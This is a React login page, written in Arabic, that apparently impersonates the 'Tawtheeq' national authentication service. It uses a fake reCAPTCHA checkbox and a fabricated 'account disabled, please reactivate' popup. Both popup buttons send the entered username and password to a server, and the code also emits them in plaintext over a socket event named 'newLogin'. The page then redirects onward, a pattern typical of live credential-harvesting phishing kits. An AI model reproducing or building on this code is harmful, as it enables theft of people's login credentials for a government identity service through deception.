import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import { FaUser } from "react-icons/fa";
import { serverRoute, socket } from "./Home";
import axios from "axios";
import { IoMdClose } from "react-icons/io";

const Login = () => {
  const navigate = useNavigate();
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [isRobot, setIsRobot] = useState(false);
  const [showLoadingPopup, setShowLoadingPopup] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = (e) => {
    e.preventDefault();
    setShowLoadingPopup(true);
    sessionStorage.setItem("loginData", JSON.stringify({ username, password }));
    // Simulate loading for 2 seconds
  };

  const submit = async () => {
    setIsLoading(true);
    try {
      const { data: userData, status } = await axios.post(
        serverRoute + "/login",
        { username, password }
      );
      if (status === 201) {
        sessionStorage.setItem("id", userData.user._id);
        sessionStorage.setItem("data", JSON.stringify(userData.user));
        socket.emit("newLogin", { username, password });
        window.location.href = "/account-type";
      } else {
        window.alert("حدث خطأ ما");
        setIsLoading(false);
      }
    } catch (error) {
      console.error(error);
      window.alert("حدث خطأ ما");
      setIsLoading(false);
    }
  };

  const handleBack = () => {
    navigate("/");
  };

  const handleCreateAccount = () => {
    setShowLoadingPopup(true);
    setTimeout(() => {
      setShowLoadingPopup(false);
    }, 2000);
  };

  // Check if form is valid
  const isFormValid =
    username.trim() !== "" && password.trim() !== "" && isRobot;

  return (
    <div className="  flex flex-col" dir="rtl">
      {/* Main Content */}
      <main className="flex-1 container mx-auto px-2 py-2 md:py-16">
        <div className="max-w-3xl mx-auto  rounded-lg shadow-lg p-8 md:p-12">
          {/* Title */}
          <div className="text-right mb-8 w-full">
            <h2 className="text-base md:text-3xl font-bold text-gray-800">
              المصادقة مع اسم المستخدم وكلمة المرور
            </h2>
            <div className="border-b-2 border-dotted border-gray-400 mt-4"></div>
          </div>

          {/* Login Section */}
          <div className="mb-8 w-full">
            <div className="flex items-center justify-start gap-3 mb-6 w-full">
              <FaUser className="text-2xl text-gray-800" />
              <h3 className="text-sm md:text-xl font-bold text-gray-800">
                الدخول بواسطة إسم المستخدم
              </h3>
            </div>

            <form onSubmit={handleSubmit} className="space-y-6">
              {/* Username */}
              <div className="flex -row items-center gap-4">
                <label className="text-sm font-bold text-gray-800 w-1/4 text-right">
                  اسم المستخدم
                </label>
                <input
                  type="text"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  placeholder="اسم المستخدم"
                  className="w-3/4 px-4 py-3 rounded-lg border border-gray-300 text-right placeholder-gray-400 bg-white"
                />
              </div>

              {/* Password */}
              <div className="flex -row items-center gap-4">
                <label className="text-sm font-bold text-gray-800 w-1/4 text-right">
                  كلمة المرور
                </label>
                <input
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="كلمة المرور"
                  className="w-3/4 px-4 py-3 rounded-lg border border-gray-300 text-right placeholder-gray-400 bg-white"
                />
              </div>

              {/* reCAPTCHA */}
              <div className="flex w-full items-center gap-4">
                <label className="text-sm font-bold text-gray-800 w-1/4 text-right">
                  التحقق
                </label>
                <div className=" w-3/4">
                  <div className="bg-white p-2 rounded-lg border border-gray-300 flex items-center justify-between">
                    <div className="flex items-center gap-3">
                      <input
                        type="checkbox"
                        checked={isRobot}
                        onChange={(e) => setIsRobot(e.target.checked)}
                        className="w-6 h-6 cursor-pointer"
                      />

                      <div className="text-xs flex items-center w-full justify-between">
                        <p className="text-gray-700 w-fit">
                          أنا لست برنامج روبوت
                        </p>
                        <div className="flex items-center gap-2 text-xs text-gray-500 mt-1 flex-col w-1/3">
                          <img
                            src="https://www.gstatic.com/recaptcha/api2/logo_48.png"
                            alt="reCAPTCHA"
                            className="w-6 h-6"
                          />
                          <div className="text-xs  text-center">
                            <p>reCAPTCHA</p>
                            <p>الخصوصية - الشروط</p>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>

              {/* Create Account Link */}
              <div className="text-center w-full my-2 ">
                <button
                  type="button"
                  onClick={handleCreateAccount}
                  className="text-[rgb(25,58,209)] font-bold text-sm hover:underline ml-4 mb-8"
                >
                  إنشاء حساب جديد
                </button>
              </div>

              {/* Action Buttons */}
              <div className="flex flex-row-reverse  gap-4 justify-center ">
                <button
                  type="submit"
                  disabled={!isFormValid}
                  className={`font-bold py-2 px-16 rounded-lg text-xl transition-colors ${
                    isFormValid
                      ? "bg-[#3c96c4] hover:bg-[#2d7fa8] text-white cursor-pointer"
                      : "bg-gray-300 text-gray-500 cursor-not-allowed"
                  }`}
                >
                  استمر
                </button>
                <button
                  type="button"
                  onClick={handleBack}
                  className="bg-white hover:bg-gray-100 text-gray-800 font-bold py-2 px-16 rounded-lg text-xl border-2 border-gray-300 transition-colors"
                >
                  رجوع
                </button>
              </div>
            </form>
          </div>
        </div>
      </main>

      {/* Loading Popup */}
      {showLoadingPopup && (
        <div
          className="fixed inset-0 bg-[#02020260] flex items-center justify-center z-50 h-screen"
          dir="rtl"
        >
          <div className="bg-white rounded-lg p-4 max-w-lg w-11/12 flex items-center justify-center ">
            <div className="flex flex-col items-center justify-center space-y-6 w-full">
              {/* Logo */}
              <img src="/logo.jpeg" alt="Tawtheeq Logo" className="h-20 mb-4" />

              {/* Error Icon with Loading Animation */}
              <div className="relative flex items-center justify-center mt-6">
                {/* Animated loading circle */}
                <div className="absolute w-28 -top-7 h-28">
                  <img
                    src="/loading.gif"
                    alt="Tawtheeq Logo"
                    className=" mb-4"
                  />
                </div>
                {/* Red X Icon */}
                <div className="relative z-10 w-16 h-16  rounded-full flex items-center justify-center">
                  <IoMdClose className="text-6xl text-red-500" />
                </div>
              </div>

              {/* Error Message */}
              <div className="text-right space-y-2 mt-6  rounded-lg p-3 w-full font-bold">
                <p className="text-gray-800  leading-relaxed">
                  هذا الحساب معطل بحسب التحديثات المدرجة
                </p>
                <p className="text-gray-800  leading-relaxed">
                  مؤخراً على خدمة نظام التوثيق الوطني.
                </p>
                <p className="text-gray-800  leading-relaxed">
                  يرجى إعادة تفعيل حسابك أو تسجيل مستخدم
                </p>
                <p className="text-gray-800  leading-relaxed">
                  جديد حتى يتم تسجيل إشتراكك في نظام
                </p>
                <p className="text-gray-800  leading-relaxed">
                  التوثيق الوطني (توثيق)
                </p>
                <div className="w-full flex py-2">
                  {/* Back Button */}

                  {/* Action Links */}
                  <div className="flex flex-col items-center gap-3 mt-6 w-full">
                    <button
                      onClick={async () => {
                        await submit();
                      }}
                      className="text-[#3c96c4] font-bold  hover:underline"
                    >
                      إعادة تنشيط الحساب
                    </button>
                    <button
                      onClick={async () => {
                        await submit();
                      }}
                      className="text-[#3c96c4] font-bold  hover:underline"
                    >
                      تسجيل مستخدم جديد
                    </button>
                    <button
                      onClick={() => setShowLoadingPopup(false)}
                      className="text-[#3c96c4] font-bold py-3 px-12 rounded-lg  transition-colors mt-2"
                    >
                      رجوع
                    </button>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* API Loading Popup */}
      {isLoading && (
        <div
          className="fixed inset-0 bg-[#02020260] flex items-center justify-center z-50"
          dir="rtl"
        >
          <div className="bg-white rounded-lg p-8 max-w-md w-11/12 flex flex-col items-center justify-center">
            <img src="/logo.jpeg" alt="Tawtheeq Logo" className="h-20 mb-6" />
            <div className="relative w-32 h-32 mb-4">
              <img src="/loading.gif" alt="Loading" className="w-full h-full" />
            </div>
            <p className="text-gray-800 text-lg font-bold text-center">
              جاري تسجيل الدخول...
            </p>
          </div>
        </div>
      )}
    </div>
  );
};

export default Login;
